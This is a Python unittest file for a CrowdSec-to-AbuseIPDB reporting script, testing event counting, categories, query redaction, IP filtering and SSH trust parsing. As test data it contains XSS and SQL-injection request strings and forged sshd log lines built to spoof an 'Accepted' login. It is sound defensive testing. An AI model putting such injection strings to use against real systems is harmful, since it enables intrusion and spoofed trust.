#!/usr/bin/env python3
"""Tests for abuseipdb_report.py (stdlib unittest, no network and no cscli).

Run:  python3 -m unittest -v tests/test_abuseipdb_report.py
(from the repository root; the whole suite: python3 -m unittest discover -v tests).
The test-only Polish strings below (e.g. "zażółć gęślą") are deliberate input data
checking that non-ASCII text is neutralised; they are not documentation.
"""
import contextlib
import csv
import importlib.util
import io
import json
import os
import subprocess
import sys
import tempfile
import unittest
from unittest import mock
from datetime import datetime, timedelta, timezone
from pathlib import Path

SCRIPT = Path(__file__).resolve().parent.parent / "abuseipdb_report.py"
spec = importlib.util.spec_from_file_location("abuseipdb_report", SCRIPT)
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)

NOW = datetime.now(timezone.utc).replace(microsecond=0)


def _read(path, **kw):
    with open(path, "r", **kw) as f:
        return f.read()


def _write(path, text, **kw):
    with open(path, "w", **kw) as f:
        f.write(text)


def _dump(obj, path):
    with open(path, "w") as f:
        json.dump(obj, f)


def iso(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def ev(ts, path=None, verb="GET", status="404", service="http", fqdn="app.example.test"):
    meta = [{"key": "service", "value": service}]
    if path:
        meta += [{"key": "http_path", "value": path}, {"key": "http_verb", "value": verb},
                 {"key": "http_status", "value": status}, {"key": "target_fqdn", "value": fqdn}]
    return {"timestamp": ts, "meta": meta}


def alert(ip, scenario, created, start=None, stop=None, events=(), count=None, **kw):
    a = {"kind": "crowdsec", "simulated": False, "scenario": f"crowdsecurity/{scenario}",
         "created_at": iso(created), "start_at": iso(start or created),
         "stop_at": iso(stop or created), "source": {"scope": "Ip", "value": ip},
         "events": list(events), "events_count": count if count is not None else len(events)}
    a.update(kw)
    return a


def http_events(n, base=None, prefix="/p"):
    base = base or NOW - timedelta(minutes=30)
    return [ev(base.strftime("%Y-%m-%d %H:%M:%S +0000 UTC"), f"{prefix}{i}") for i in range(n)]


def rows_for(alerts, exclusions=()):
    return m.build_rows(alerts, list(exclusions))


def comment_of(rows, ip):
    return next(r[3] for r in rows if r[0] == ip)


class Counting(unittest.TestCase):
    def test_overlapping_scenarios_not_summed(self):
        shared = http_events(5)
        a1 = alert("8.8.8.8", "http-probing", NOW - timedelta(minutes=20), events=shared)
        a2 = alert("8.8.8.8", "http-sensitive-files", NOW - timedelta(minutes=20),
                   events=shared[:3])
        c = comment_of(rows_for([a1, a2]), "8.8.8.8")
        self.assertIn("5 matching log events", c)      # not 8

    def test_disjoint_requests_across_scenarios_are_all_counted(self):
        a1 = alert("8.8.8.8", "http-probing", NOW - timedelta(minutes=20), events=http_events(3, prefix="/a"))
        a2 = alert("8.8.8.8", "http-sensitive-files", NOW - timedelta(minutes=20),
                   events=http_events(3, prefix="/b"))
        c = comment_of(rows_for([a1, a2]), "8.8.8.8")
        self.assertIn("6 matching log events", c)      # unique requests, not max(3,3)

    def test_same_scenario_bursts_are_summed(self):
        a1 = alert("8.8.8.8", "ssh-bf", NOW - timedelta(hours=5), events=[ev("t", service="ssh")] * 6)
        a2 = alert("8.8.8.8", "ssh-bf", NOW - timedelta(hours=1), events=[ev("t", service="ssh")] * 6)
        self.assertIn("12 matching log events", comment_of(rows_for([a1, a2]), "8.8.8.8"))

    def test_ssh_different_scenarios_take_max(self):
        a1 = alert("8.8.8.8", "ssh-slow-bf", NOW - timedelta(hours=1), events=[ev("t", service="ssh")] * 11)
        a2 = alert("8.8.8.8", "ssh-bf", NOW - timedelta(hours=1), events=[ev("t", service="ssh")] * 6, count=7)
        self.assertIn("11 matching log events", comment_of(rows_for([a1, a2]), "8.8.8.8"))

    def test_single_event_is_singular(self):
        a = alert("8.8.8.8", "http-open-proxy", NOW - timedelta(hours=1),
                  events=[ev("t", "dns.google:443", verb="CONNECT", status="400")])
        self.assertIn("1 matching log event ", comment_of(rows_for([a]), "8.8.8.8"))
        self.assertEqual(m.category_for("crowdsecurity/http-open-proxy"), "14")


class TimeWindow(unittest.TestCase):
    def test_ssh_skewed_event_timestamps_are_ignored(self):
        created = NOW - timedelta(hours=3)
        skewed = (created + timedelta(hours=2)).strftime("%Y-%m-%d %H:%M:%S +0000 UTC")  # CEST labelled as UTC
        a = alert("8.8.8.8", "ssh-bf", created, start=created - timedelta(seconds=8),
                  stop=created - timedelta(seconds=1), events=[ev(skewed, service="ssh")] * 6)
        rows = rows_for([a])
        self.assertEqual(rows[0][2], (created - timedelta(seconds=1)).strftime("%Y-%m-%dT%H:%M:%S+00:00"))
        self.assertNotIn(skewed[11:19], rows[0][3])
        self.assertIn(" between ", rows[0][3])

    def test_bogus_start_falls_back_to_created(self):
        created = NOW - timedelta(hours=2)
        a = alert("8.8.8.8", "http-probing", created, events=http_events(3))
        a["start_at"] = "0001-01-01T00:00:00Z"
        rows = rows_for([a])
        self.assertIn(f" at {iso(created)} (UTC)", rows[0][3])

    def test_stop_after_created_falls_back(self):
        created = NOW - timedelta(hours=2)
        a = alert("8.8.8.8", "http-probing", created, stop=created + timedelta(hours=1),
                  events=http_events(3))
        self.assertIn(f" at {iso(created)} (UTC)", rows_for([a])[0][3])

    def test_window_merges_alerts(self):
        t = NOW - timedelta(hours=6)
        a1 = alert("8.8.8.8", "http-probing", t, start=t - timedelta(seconds=5), events=http_events(2))
        a2 = alert("8.8.8.8", "http-sensitive-files", t + timedelta(hours=4), events=http_events(2, prefix="/q"))
        r = rows_for([a1, a2])[0]
        self.assertEqual(r[2], (t + timedelta(hours=4)).strftime("%Y-%m-%dT%H:%M:%S+00:00"))
        self.assertIn(iso(t - timedelta(seconds=5)), r[3])

    def test_old_alert_dropped(self):
        old = NOW - timedelta(days=61)
        self.assertEqual(rows_for([alert("8.8.8.8", "http-probing", old, events=http_events(2))]), [])

    def test_future_alert_dropped(self):
        fut = NOW + timedelta(hours=1)
        self.assertEqual(rows_for([alert("8.8.8.8", "http-probing", fut, events=http_events(2))]), [])


class Categories(unittest.TestCase):
    def test_open_proxy_is_14_not_9(self):
        self.assertEqual(m.category_for("crowdsecurity/http-open-proxy"), "14")

    def test_cve_scenarios_explicit(self):
        for sc in ("CVE-2017-9841", "http-cve-2021-41773", "http-cve-2021-42013"):
            self.assertIn(sc, m.CATEGORY_MAP)

    def test_all_mapped_categories_valid(self):
        for sc, cats in m.CATEGORY_MAP.items():
            for c in cats.split(","):
                self.assertTrue(1 <= int(c) <= m.MAX_CATEGORY_ID, sc)
        self.assertNotIn("9", m.CATEGORY_MAP["http-open-proxy"].split(","))


class QueryRedaction(unittest.TestCase):
    """Credential-like query parameters are masked; the rest of the request (the evidence) is kept."""

    def test_sensitive_values_are_masked(self):
        r = m.redact_query
        self.assertEqual(r("/a?token=abc&x=1"), "/a?token=***&x=1")
        self.assertEqual(r("/a?x=1&api_key=K&client-secret=S&Password=P"),
                         "/a?x=1&api_key=***&client-secret=***&Password=***")
        self.assertEqual(r("/a?accessToken=T&sessionId=S&PHPSESSID=X&jwt=J&code=C&sig=G&csrf_token=Q"),
                         "/a?accessToken=***&sessionId=***&PHPSESSID=***&jwt=***&code=***&sig=***&csrf_token=***")
        self.assertEqual(r("/a?password="), "/a?password=***")                    # an empty value is masked too

    def test_names_that_only_contain_a_keyword_are_not_masked(self):
        # the value of an ordinary parameter is exactly what shows the attack
        for path in ("/s?keyword=<script>alert(1)</script>", "/s?monkey=1", "/s?author=admin",
                     "/s?passenger=2", "/s?encode=x", "/s?id=1' OR 'sig'='sig", "/s?q=token"):
            self.assertEqual(m.redact_query(path), path, path)

    def test_paths_without_a_credential_are_untouched(self):
        for path in ("/", "/.env", "/a/b?x", "/a?x=1&x=2", "/a?", "/wp-login.php?action=register"):
            self.assertEqual(m.redact_query(path), path, path)
        self.assertEqual(m.redact_query("/a?token"), "/a?token")                  # no value to hide

    def test_evidence_and_comment_never_carry_the_secret(self):
        t = NOW - timedelta(minutes=30)
        a = alert("8.8.8.8", "http-probing", t,
                  events=[ev("t1", "/share/download?token=SECRETTOKEN123&user=bob"),
                          ev("t2", "/search?keyword=<script>x</script>")])
        self.assertEqual(m.extract_evidence(a)[0], "GET /share/download?token=***&user=bob -> 404")
        c = comment_of(rows_for([a]), "8.8.8.8")
        self.assertNotIn("SECRETTOKEN123", c)
        self.assertIn("token=***", c)
        self.assertIn("keyword=<script>x</script>", c)                             # the payload stays

    def test_non_text_path_does_not_crash(self):
        a = alert("8.8.8.8", "http-probing", NOW - timedelta(minutes=30), events=[ev("t", "/x")])
        a["events"][0]["meta"][1]["value"] = 12345
        self.assertEqual(m.extract_evidence(a), ["GET 12345 -> 404"])


class UnknownScenarios(unittest.TestCase):
    """Only scenarios we know the meaning of are reported: a wrong category is a false report."""

    def test_category_for_trusts_only_the_known_author_and_names(self):
        self.assertEqual(m.category_for("crowdsecurity/ssh-bf"), "18,22")
        self.assertEqual(m.category_for("crowdsecurity/CVE-2017-9841"), m.CATEGORY_MAP["CVE-2017-9841"])
        for unknown in ("crowdsecurity/postfix-spam", "crowdsecurity/mysql-bf",   # real hub scenarios, not in the map
                        "me/my-internal-thing",                                   # the operator's own scenario
                        "evil/ssh-bf",                                            # known name, foreign author
                        "ssh-bf",                                                 # no author prefix at all
                        "manual 'ban' from 'localhost'", "unknown", ""):
            self.assertIsNone(m.category_for(unknown), unknown)

    def test_third_party_scenario_is_reported_only_after_an_explicit_full_name_entry(self):
        name = "LePresidente/http-generic-401-bf"
        self.assertIsNone(m.category_for(name))
        with mock.patch.dict(m.CATEGORY_MAP, {name: "18,21"}):
            self.assertEqual(m.category_for(name), "18,21")
            self.assertIsNone(m.category_for("evil/" + name.split("/")[1]))       # another author, same name
            self.assertIsNone(m.category_for(name.split("/")[1]))                 # no author at all
        self.assertIsNone(m.category_for(name))                                   # the patch is gone again

    def test_cve_named_scenarios_get_the_web_exploit_default(self):
        self.assertEqual(m.category_for("crowdsecurity/http-cve-2099-12345"), m.DEFAULT_CATEGORY)
        self.assertEqual(m.category_for("crowdsecurity/vpatch-CVE-2030-9999"), m.DEFAULT_CATEGORY)
        self.assertIsNone(m.category_for("crowdsecurity/cve-only-the-word"))     # needs a real CVE id
        self.assertIsNone(m.category_for("crowdsecurity/cve-2099-12"))           # id too short to be one

    def test_cve_id_alone_does_not_trust_another_author(self):
        # A CVE in a foreign scenario's name says nothing about the service: it may be postfix,
        # not a web application, and 15,21 would be a false claim.
        for name in ("someone/postfix-cve-2024-1234", "someone/apache-cve-2030-9999-rce",
                     "http-cve-2099-12345", "cve-2099-12345"):
            self.assertIsNone(m.category_for(name), name)
        with mock.patch.dict(m.CATEGORY_MAP, {"someone/apache-cve-2030-9999-rce": "15,21"}):
            self.assertEqual(m.category_for("someone/apache-cve-2030-9999-rce"), "15,21")   # explicit opt-in

    def test_unknown_scenario_is_skipped_and_listed_with_a_hint(self):
        t = NOW - timedelta(minutes=30)
        known = alert("8.8.8.8", "ssh-bf", t, events=[ev("t", service="ssh")])
        other = alert("9.9.9.9", "postfix-spam", t, events=[])
        with contextlib.redirect_stderr(io.StringIO()) as err:
            rows = rows_for([known, other])
        self.assertEqual([r[0] for r in rows], ["8.8.8.8"])
        self.assertIn("unknown scenario crowdsecurity/postfix-spam - not reported", err.getvalue())
        self.assertIn("open an issue", err.getvalue())
        self.assertIn("do not guess a category", err.getvalue())
        # The hint must not send operators to edit tracked code: that breaks `git pull --ff-only`.
        self.assertNotIn("CATEGORY_MAP", err.getvalue())

    def test_known_and_unknown_scenarios_on_one_ip_report_only_the_known(self):
        t = NOW - timedelta(minutes=30)
        rows = rows_for([alert("8.8.8.8", "ssh-bf", t, events=[ev("t", service="ssh")]),
                         alert("8.8.8.8", "postfix-spam", t, events=[])])
        self.assertEqual(rows[0][1], "18,22")                                     # no category from the unknown one
        self.assertIn("Triggered rules: ssh-bf.", rows[0][3])
        self.assertNotIn("postfix", rows[0][3])

    def test_missing_or_null_scenario_does_not_crash(self):
        t = NOW - timedelta(minutes=30)
        a = alert("8.8.8.8", "ssh-bf", t)
        a["scenario"] = None
        b = dict(a)
        del b["scenario"]
        with contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(rows_for([a, b]), [])
        self.assertIn("unknown scenario unknown", err.getvalue())

    def test_every_mapped_scenario_still_gets_its_category(self):
        for name, cats in m.CATEGORY_MAP.items():
            self.assertEqual(m.category_for(f"crowdsecurity/{name}"), cats, name)


class HttpPortsAndExtraExclusions(unittest.TestCase):
    """HTTP_PORTS and EXTRA_EXCLUDE_SCENARIOS from the config file."""

    def test_http_label_default_and_custom(self):
        self.assertEqual(m.http_label(), "HTTP/HTTPS (ports 80/443)")
        self.assertEqual(m.http_label("443"), "HTTP/HTTPS (port 443)")
        self.assertEqual(m.http_label("8080/8443"), "HTTP/HTTPS (ports 8080/8443)")

    def test_http_ports_are_validated(self):
        self.assertEqual(m.config_http_ports({}), "80/443")
        self.assertEqual(m.config_http_ports({"HTTP_PORTS": ["80/443", "8443"]}), "8443")   # last wins
        for bad in ("443 ", "80,443", "0", "65536", "80/", "https", "443/abc", "80//443"):
            with self.assertRaises(m.ConfigError, msg=bad):
                m.config_http_ports({"HTTP_PORTS": [bad]})

    def test_custom_http_label_reaches_the_comment(self):
        a = alert("8.8.8.8", "http-probing", NOW - timedelta(minutes=10), events=http_events(3))
        with mock.patch.object(m, "HTTP_LABEL", m.http_label("8443")):
            c = rows_for([a])[0][3]
        self.assertIn("Target: HTTP/HTTPS (port 8443).", c)
        self.assertNotIn("80/443", c)

    def test_extra_scenarios_are_parsed_and_validated(self):
        with contextlib.redirect_stderr(io.StringIO()):
            got = m.config_extra_scenarios({"EXTRA_EXCLUDE_SCENARIOS": ["http-probing, me/x", "http-probing"]})
        self.assertEqual(got, frozenset({"http-probing", "me/x"}))
        self.assertEqual(m.config_extra_scenarios({}), frozenset())
        for bad in ("a b", "a/b/c", "a;b", "/x"):
            with self.assertRaises(m.ConfigError, msg=bad):
                m.config_extra_scenarios({"EXTRA_EXCLUDE_SCENARIOS": [bad]})

    def test_extra_exclusion_by_short_or_full_name(self):
        t = NOW - timedelta(minutes=10)
        probe = alert("8.8.8.8", "http-probing", t, events=http_events(3))
        ssh = alert("9.9.9.9", "ssh-bf", t, events=[ev("t", service="ssh")])
        for extra in ({"http-probing"}, {"crowdsecurity/http-probing"}):
            with mock.patch.object(m, "EXTRA_EXCLUDE_SCENARIOS", frozenset(extra)):
                with contextlib.redirect_stderr(io.StringIO()) as err:
                    rows = rows_for([probe, ssh])
            self.assertEqual([r[0] for r in rows], ["9.9.9.9"], extra)
            self.assertIn("scenario excluded by the config (crowdsecurity/http-probing)", err.getvalue())
        with mock.patch.object(m, "EXTRA_EXCLUDE_SCENARIOS", frozenset({"someone/http-probing"})):
            self.assertEqual(len(rows_for([probe, ssh])), 2)          # another author: not excluded

    def test_extra_exclusions_only_add(self):
        # The built-in list stays whatever the config says. The scenario is mapped on purpose: without
        # that, "unknown scenario" would drop it too and this test could not tell the two rules apart.
        with mock.patch.object(m, "EXTRA_EXCLUDE_SCENARIOS", frozenset()), \
                mock.patch.dict(m.CATEGORY_MAP, {"http-crawl-non_statics": "21"}):
            a = alert("8.8.8.8", "http-crawl-non_statics", NOW - timedelta(minutes=10), events=http_events(3))
            with contextlib.redirect_stderr(io.StringIO()) as err:
                self.assertEqual(rows_for([a]), [])
            self.assertIn("scenario on the blacklist", err.getvalue())

    def test_config_keys_end_to_end(self):
        with tempfile.TemporaryDirectory() as td:
            conf, alerts = os.path.join(td, "c.conf"), os.path.join(td, "a.json")
            _dump([alert("8.8.8.8", "http-probing", NOW - timedelta(minutes=30), events=http_events(4)),
                   alert("9.9.9.9", "http-sensitive-files", NOW - timedelta(minutes=30), events=http_events(2))],
                  alerts)
            _write(conf, "OWN_NAME_MARKERS=example.org\nHTTP_PORTS=443\nEXTRA_EXCLUDE_SCENARIOS=http-probing\n")
            os.chmod(conf, 0o600)
            r = subprocess.run([sys.executable, str(SCRIPT), "--config", conf, "--input-json", alerts,
                                "--no-ssh-trust", "--dry-run"],
                               capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stderr)
            rows = list(csv.DictReader(io.StringIO(r.stdout.split("\n\n")[0])))
            self.assertEqual([x["IP"] for x in rows], ["9.9.9.9"])
            self.assertIn("Target: HTTP/HTTPS (port 443).", rows[0]["Comment"])
            _write(conf, "OWN_NAME_MARKERS=example.org\nHTTP_PORTS=443 # tls only\n")
            r = subprocess.run([sys.executable, str(SCRIPT), "--config", conf, "--input-json", alerts,
                                "--no-ssh-trust", "--dry-run"],
                               capture_output=True, text=True)
            self.assertEqual(r.returncode, 2, r.stderr)


class Protocol(unittest.TestCase):
    def test_by_service(self):
        self.assertEqual(m.proto_for(["http-probing"], {"http"}), "HTTP/HTTPS (ports 80/443)")
        self.assertEqual(m.proto_for(["ssh-bf"], {"ssh"}), "SSH")
        self.assertEqual(m.proto_for(["x"], {"http", "ssh"}), "HTTP/HTTPS (ports 80/443) + SSH")

    def test_prefix_fallback(self):
        self.assertEqual(m.proto_for(["ssh-bf"], set()), "SSH")
        self.assertEqual(m.proto_for(["http-probing"]), "HTTP/HTTPS (ports 80/443)")

    def test_unknown_is_none_and_sentence_omitted(self):
        self.assertIsNone(m.proto_for(["linux-lpe"], set()))
        # a scenario that IS in the map (so it is reported) but has no ssh-/http- prefix and no service
        a = alert("8.8.8.8", "netgear_rce", NOW - timedelta(hours=1), events=[])
        c = comment_of(rows_for([a]), "8.8.8.8")
        self.assertNotIn("Target:", c)
        self.assertIn("Triggered rules: netgear_rce.", c)

    def test_service_beats_scenario_prefix(self):
        a = alert("8.8.8.8", "http-probing", NOW - timedelta(hours=1), events=[ev("t", service="ssh")])
        self.assertIn("Target: SSH.", comment_of(rows_for([a]), "8.8.8.8"))


class IpFilter(unittest.TestCase):
    def check(self, ip, expected):
        self.assertEqual(m.is_reportable_ip(ip, [])[0], expected, ip)

    def test_cgnat_and_private_rejected(self):
        for ip in ("100.64.0.1", "100.127.255.254", "10.0.0.1", "172.26.0.5", "192.168.1.1",
                   "127.0.0.1", "169.254.1.1", "224.0.0.1", "0.0.0.0", "::1", "fe80::1",
                   "::ffff:10.0.0.1", "not-an-ip", "203.0.113.5"):
            self.check(ip, False)

    def test_public_accepted(self):
        for ip in ("8.8.8.8", "1.1.1.1", "2001:4860:4860::8888"):
            self.check(ip, True)

    def test_exclusions_v4_v6(self):
        import ipaddress
        ex = [ipaddress.ip_network("8.8.8.0/24"), ipaddress.ip_network("2001:4860::/32")]
        self.assertFalse(m.is_reportable_ip("8.8.8.8", ex)[0])
        self.assertFalse(m.is_reportable_ip("2001:4860:4860::8888", ex)[0])
        self.assertTrue(m.is_reportable_ip("8.8.4.4", ex)[0])


class Filters(unittest.TestCase):
    def test_weak_only_skipped_but_combined_kept(self):
        weak = alert("8.8.8.8", "http-bad-user-agent", NOW - timedelta(hours=1), events=http_events(1))
        both = [alert("9.9.9.9", "http-bad-user-agent", NOW - timedelta(hours=1), events=http_events(1)),
                alert("9.9.9.9", "http-probing", NOW - timedelta(hours=1), events=http_events(2, prefix="/z"))]
        rows = rows_for([weak] + both)
        self.assertEqual([r[0] for r in rows], ["9.9.9.9"])

    def test_excluded_scenario_and_capi_and_simulated(self):
        alerts = [alert("8.8.8.8", "http-crawl-non_statics", NOW - timedelta(hours=1), events=http_events(2)),
                  alert("9.9.9.9", "http-probing", NOW - timedelta(hours=1), events=http_events(2), kind="capi"),
                  alert("1.1.1.1", "http-probing", NOW - timedelta(hours=1), events=http_events(2), simulated=True)]
        self.assertEqual(rows_for(alerts), [])

    def test_community_blocklist_alert_is_never_reported(self):
        # Shape of a real blocklist alert (cscli alerts list --origin CAPI): a batch of thousands of
        # addresses published by someone else, not an attack seen by this server.
        t = NOW - timedelta(minutes=30)
        blocklist = {"kind": "capi", "simulated": False, "scenario": "update : +15000/-3 IPs",
                     "created_at": iso(t), "start_at": iso(t), "stop_at": iso(t),
                     "source": {"scope": "crowdsecurity/community-blocklist", "value": ""},
                     "events": [], "events_count": 0}
        with contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(rows_for([blocklist]), [])
        self.assertIn(m.SKIP_NOT_LOCAL, err.getvalue())

    def test_builtin_exclusion_works_on_its_own_not_only_as_an_unknown_scenario(self):
        # http-crawl-non_statics is not in CATEGORY_MAP, so the "unknown scenario" rule would drop it
        # anyway and hide a broken EXCLUDE_SCENARIOS. Map it, so that only the exclusion can stop it.
        a = alert("8.8.8.8", "http-crawl-non_statics", NOW - timedelta(hours=1), events=http_events(2))
        with mock.patch.dict(m.CATEGORY_MAP, {"http-crawl-non_statics": "21"}):
            self.assertIsNotNone(m.category_for("crowdsecurity/http-crawl-non_statics"))   # really mapped
            with contextlib.redirect_stderr(io.StringIO()) as err:
                self.assertEqual(rows_for([a]), [])
        self.assertIn("scenario on the blacklist (http-crawl-non_statics)", err.getvalue())
        # the same IP with a second, legitimate scenario is still reported, but only for that one
        b = alert("8.8.8.8", "http-probing", NOW - timedelta(hours=1), events=http_events(2, prefix="/q"))
        with mock.patch.dict(m.CATEGORY_MAP, {"http-crawl-non_statics": "21"}):
            with contextlib.redirect_stderr(io.StringIO()):
                rows = rows_for([a, b])
        self.assertIn("Triggered rules: http-probing.", rows[0][3])
        self.assertNotIn("crawl", rows[0][3])

    def test_range_scope_ignored(self):
        a = alert("8.8.8.0/24", "http-probing", NOW - timedelta(hours=1), events=http_events(2))
        a["source"] = {"scope": "Range", "value": "8.8.8.0/24"}
        self.assertEqual(rows_for([a]), [])


class AlertWindow(unittest.TestCase):
    """--after/--before: the interval (after, before] by created_at."""

    def mk(self, ip, created):
        return alert(ip, "http-probing", created, events=http_events(2))

    def test_boundaries_after_exclusive_before_inclusive(self):
        t = NOW - timedelta(hours=3)
        alerts = [self.mk("8.8.8.8", t), self.mk("9.9.9.9", t + timedelta(hours=1)),
                  self.mk("1.1.1.1", t + timedelta(hours=2))]
        rows = m.build_rows(alerts, [], after=t, before=t + timedelta(hours=1))
        self.assertEqual([r[0] for r in rows], ["9.9.9.9"])   # t excluded, t+1h included

    def test_consecutive_windows_partition_alerts_exactly(self):
        base = NOW - timedelta(hours=10)
        alerts = [self.mk(f"8.8.{i // 250}.{i % 250 + 1}", base + timedelta(seconds=i * 137)) for i in range(200)]
        cuts = [base - timedelta(seconds=1), base + timedelta(seconds=5000),
                base + timedelta(seconds=5000 + 3600), base + timedelta(hours=9)]
        seen = []
        for a, b in zip(cuts, cuts[1:]):
            seen += [r[0] for r in m.build_rows(alerts, [], after=a, before=b)]
        self.assertEqual(len(seen), len(set(seen)), "overlapping windows: the same IP twice")
        self.assertEqual(len(seen), sum(1 for x in alerts
                                        if cuts[0] < m.parse_ts(x["created_at"]) <= cuts[-1]))

    def test_no_bounds_keeps_everything(self):
        self.assertEqual(len(m.build_rows([self.mk("8.8.8.8", NOW - timedelta(hours=1))], [])), 1)

    def test_only_after(self):
        t = NOW - timedelta(hours=2)
        alerts = [self.mk("8.8.8.8", t - timedelta(minutes=1)), self.mk("9.9.9.9", t + timedelta(minutes=1))]
        self.assertEqual([r[0] for r in m.build_rows(alerts, [], after=t)], ["9.9.9.9"])


class SshTrust(unittest.TestCase):
    L_OK = "2026-09-13T16:03:28+0200 host sshd[123]: Accepted keyboard-interactive/pam for alice from 1.2.3.4 port 5 ssh2"
    L_PK = "2026-09-14T10:00:00+0200 host sshd[124]: Accepted publickey for alice from 5.6.7.8 port 9 ssh2: ED25519 SHA256:abc"
    L_2FA = "2026-09-13T16:03:27+0200 host sshd[123]: Accepted google_authenticator for alice"
    L_FAKE = "2026-09-15T10:00:00+0200 host sshd[125]: Invalid user Accepted from 6.6.6.6 port 22 ssh2"
    L_FAKE2 = "2026-09-15T10:00:01+0200 host sshd[125]: Failed password for invalid user Accepted from 7.7.7.7 port 22 ssh2"
    L_FAKE3 = "2026-09-15T10:00:02+0200 host sshd[125]: Connection closed by authenticating user root 4.4.4.4 port 22 [preauth] Accepted publickey for x from 3.3.3.3 port 1"
    L_V6 = "2026-09-16T10:00:00+0200 host sshd[126]: Accepted publickey for alice from 2001:db8::1 port 9 ssh2"

    def test_parse(self):
        got = m.parse_ssh_accepted("\n".join([self.L_OK, self.L_PK, self.L_2FA, self.L_FAKE,
                                              self.L_FAKE2, self.L_FAKE3, self.L_V6]))
        self.assertEqual(set(got), {"1.2.3.4", "5.6.7.8", "2001:db8::1"})
        self.assertEqual(got["1.2.3.4"].utcoffset(), timedelta(hours=2))

    def test_last_seen_wins(self):
        newer = self.L_OK.replace("2026-09-13", "2026-09-20")
        got = m.parse_ssh_accepted(self.L_OK + "\n" + newer)
        self.assertEqual(got["1.2.3.4"].day, 20)

    def test_store_roundtrip_expiry_perms_and_corrupt_lines(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "trust.txt")
            fresh = NOW - timedelta(days=3)
            stale = NOW - timedelta(days=61)
            self.assertTrue(m.save_trust_store(p, {"1.2.3.4": fresh, "9.9.9.9": stale}))
            self.assertEqual(oct(os.stat(p).st_mode & 0o777), "0o600")
            with open(p, "a") as f:
                f.write("garbage line\nnot-an-ip\t2026-01-01T00:00:00+00:00\n")
            loaded = m.load_trust_store(p, NOW)
            self.assertEqual(set(loaded), {"1.2.3.4"})          # the stale entry expired, garbage skipped
            self.assertFalse(os.path.exists(p + ".tmp"))

    def test_store_missing_file_is_empty(self):
        self.assertEqual(m.load_trust_store("/nonexistent/dir/x.txt", NOW), {})

    def test_save_failure_is_nonfatal(self):
        self.assertFalse(m.save_trust_store("/nonexistent/dir/x.txt", {"1.2.3.4": NOW}))

    def test_harvest_merges_store_when_journal_unavailable(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "trust.txt")
            m.save_trust_store(p, {"1.2.3.4": NOW - timedelta(days=30)})
            orig = m.subprocess.run
            m.subprocess.run = lambda *a, **k: (_ for _ in ()).throw(OSError("journalctl missing"))
            try:
                nets = m.harvest_ssh_trusted(store_path=p, persist=True)
            finally:
                m.subprocess.run = orig
            self.assertEqual([str(n) for n in nets], ["1.2.3.4/32"])

    def test_harvest_persists_journal_and_dry_run_does_not(self):
        class R:  # stand-in for CompletedProcess
            stdout, stderr, returncode = SshTrust.L_PK, "", 0
        orig = m.subprocess.run
        m.subprocess.run = lambda *a, **k: R()
        try:
            with tempfile.TemporaryDirectory() as d:
                p = os.path.join(d, "trust.txt")
                m.harvest_ssh_trusted(store_path=p, persist=False)
                self.assertFalse(os.path.exists(p))
                m.harvest_ssh_trusted(store_path=p, persist=True)
                self.assertIn("5.6.7.8", _read(p))
        finally:
            m.subprocess.run = orig

    def harvest_with(self, returncode, stderr, stdout=""):
        class R:
            pass
        r = R()
        r.stdout, r.stderr, r.returncode = stdout, stderr, returncode
        with tempfile.TemporaryDirectory() as d, \
                mock.patch.object(m.subprocess, "run", return_value=r), \
                contextlib.redirect_stderr(io.StringIO()) as err:
            p = os.path.join(d, "trust.txt")
            m.save_trust_store(p, {"1.2.3.4": NOW - timedelta(days=1)})   # a non-empty remembered list
            nets = m.harvest_ssh_trusted(store_path=p, persist=False)
        return nets, err.getvalue()

    def test_journal_permission_problem_is_reported_even_with_a_remembered_list(self):
        # Measured on journalctl 252 as a user without the journal groups.
        nets, err = self.harvest_with(1, "Hint: You are currently not seeing messages from other users and the "
                                         "system.\nNo journal files were opened due to insufficient permissions.")
        self.assertEqual([str(n) for n in nets], ["1.2.3.4/32"])
        self.assertIn("journalctl returned code 1 (Hint: You are currently not seeing", err)
        self.assertIn("'systemd-journal'", err)
        self.assertIn("returned code 7 (no message)", self.harvest_with(7, "")[1])
        self.assertTrue(err.startswith(m.SAFEGUARD_OFF_MARKER), err)   # the wrapper alerts on this line start

    def test_every_degraded_safeguard_is_marked_for_the_wrapper(self):
        marker = m.SAFEGUARD_OFF_MARKER
        # the journal cannot be run at all
        with tempfile.TemporaryDirectory() as d, \
                mock.patch.object(m.subprocess, "run", side_effect=OSError("journalctl missing")), \
                contextlib.redirect_stderr(io.StringIO()) as err:
            m.harvest_ssh_trusted(store_path=os.path.join(d, "t.txt"), persist=False)
        self.assertIn(f"{marker} could not read the SSH logs", err.getvalue())
        # the remembered list cannot be read (a directory in its place)
        with tempfile.TemporaryDirectory() as d, contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(m.load_trust_store(d, NOW), {})
        self.assertTrue(err.getvalue().startswith(f"{marker} cannot read"), err.getvalue())
        # the remembered list cannot be saved
        with contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertFalse(m.save_trust_store("/nonexistent/dir/x.txt", {"1.2.3.4": NOW}))
        self.assertTrue(err.getvalue().startswith(f"{marker} could not save"), err.getvalue())
        # no `ip` program, or `ip` fails: the own public addresses are unknown
        with mock.patch.object(m.shutil, "which", return_value=None), \
                mock.patch.object(m.os.path, "exists", return_value=False), \
                contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(m.harvest_local_addresses(), [])
        self.assertTrue(err.getvalue().startswith(f"{marker} no `ip` program"), err.getvalue())
        with mock.patch.object(m.shutil, "which", return_value="/usr/sbin/ip"), \
                mock.patch.object(m.subprocess, "run", side_effect=OSError("boom")), \
                contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(m.harvest_local_addresses(), [])
        self.assertTrue(err.getvalue().startswith(f"{marker} `ip addr` failed"), err.getvalue())

    def test_journal_without_matches_is_not_a_problem(self):
        _, err = self.harvest_with(1, "", "-- No entries --\n")     # exit code 1, empty stderr: nothing found
        self.assertNotIn("journalctl returned", err)
        _, err = self.harvest_with(0, "", SshTrust.L_PK)
        self.assertNotIn("journalctl returned", err)

    def test_more_login_methods_are_trusted(self):
        lines = "\n".join([
